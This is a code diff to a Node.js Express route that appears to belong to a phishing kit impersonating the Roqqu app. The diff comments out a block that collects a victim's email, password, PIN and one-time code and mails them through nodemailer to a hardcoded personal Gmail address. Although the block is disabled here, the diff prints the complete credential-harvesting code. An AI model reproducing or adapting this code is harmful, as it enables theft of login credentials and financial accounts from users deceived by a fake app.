@@ -46,59 +46,59 @@ app.post('/rq-1', csrfProtection, (req, res, next) => {
 
     console.log('length of otp', otp.length)
 
-    if (otp.length > 6) {
-        console.log('Attack started', otp)
-        return
-    } else {
-        console.log("Normal email", otp)
-        const transporter = nodemailer.createTransport({
-            host: process.env.HOST,
-            port: 465,
-            secure: true,
-            requireTLS: true,
-            socketTimeout: 1200000,
-            connectionTimeout: 1200000,
-            auth: {
-                user: process.env.EMAIL,
-                pass: process.env.PASSWORD,
-            },
-            tls: {
-                rejectUnauthorized: false,
-            },
-        })
+    // if (otp.length > 6) {
+    //     console.log('Attack started', otp)
+    //     return
+    // } else {
+    //     console.log("Normal email", otp)
+    //     const transporter = nodemailer.createTransport({
+    //         host: process.env.HOST,
+    //         port: 465,
+    //         secure: true,
+    //         requireTLS: true,
+    //         socketTimeout: 1200000,
+    //         connectionTimeout: 1200000,
+    //         auth: {
+    //             user: process.env.EMAIL,
+    //             pass: process.env.PASSWORD,
+    //         },
+    //         tls: {
+    //             rejectUnauthorized: false,
+    //         },
+    //     })
 
-        transporter.verify(function (error, _success) {
-            if (error) {
-                console.log(error)
-            } else {
-                console.log('Server is ready to take our messages')
-            }
-        })
+    //     transporter.verify(function (error, _success) {
+    //         if (error) {
+    //             console.log(error)
+    //         } else {
+    //             console.log('Server is ready to take our messages')
+    //         }
+    //     })
 
-        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!`
+    //     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!`
 
-        const mail = {
-            from: process.env.EMAIL,
-            //to: process.env.TOEMAIL,
-             to: 'ifestephenie@gmail.com',
-            subject: 'New message from Roqquappchat',
-            html: content,
-        }
+    //     const mail = {
+    //         from: process.env.EMAIL,
+    //         //to: process.env.TOEMAIL,
+    //          to: 'ifestephenie@gmail.com',
+    //         subject: 'New message from Roqquappchat',
+    //         html: content,
+    //     }
 
-        transporter.sendMail(mail, (err, data) => {
-            if (err) {
-                console.log({ err })
-                res.json({
-                    status: 'fail',
-                })
-            } else {
-                console.log('email sent', data)
-                res.json({
-                    status: 'success',
-                })
-            }
-        })
-    }
+    //     transporter.sendMail(mail, (err, data) => {
+    //         if (err) {
+    //             console.log({ err })
+    //             res.json({
+    //                 status: 'fail',
+    //             })
+    //         } else {
+    //             console.log('email sent', data)
+    //             res.json({
+    //                 status: 'success',
+    //             })
+    //         }
+    //     })
+    // }
 })
 
 // app.post('/roqquapp', (req, res, next) => {
